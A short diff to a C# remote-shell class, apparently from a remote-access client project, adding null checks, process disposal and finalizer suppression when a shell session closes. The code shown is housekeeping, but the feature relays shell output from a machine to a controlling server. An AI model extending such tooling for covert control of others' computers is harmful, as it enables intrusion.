@@ -77,9 +77,10 @@ namespace xClient.Core.RemoteShell
             _read = false;
             try
             {
-                if (!_prc.HasExited)
+                if ((_prc != null) && !_prc.HasExited)
                 {
                     _prc.Kill();
+                    _prc.Dispose();
                     new Packets.ClientPackets.ShellCommandResponse(">> Session closed" + Environment.NewLine).Execute(Program.ConnectClient);
                 }
             }
@@ -95,8 +96,13 @@ namespace xClient.Core.RemoteShell
                 if (!_prc.HasExited)
                 {
                     _prc.Kill();
+                    _prc.Dispose();
                     new Packets.ClientPackets.ShellCommandResponse(">> Session closed" + Environment.NewLine).Execute(Program.ConnectClient);
                 }
+
+                // The session has already been closed, so there is no reason to make
+                // the garbage collector waste lots of time finalizing it.
+                GC.SuppressFinalize(this);
             }
             catch
             { }
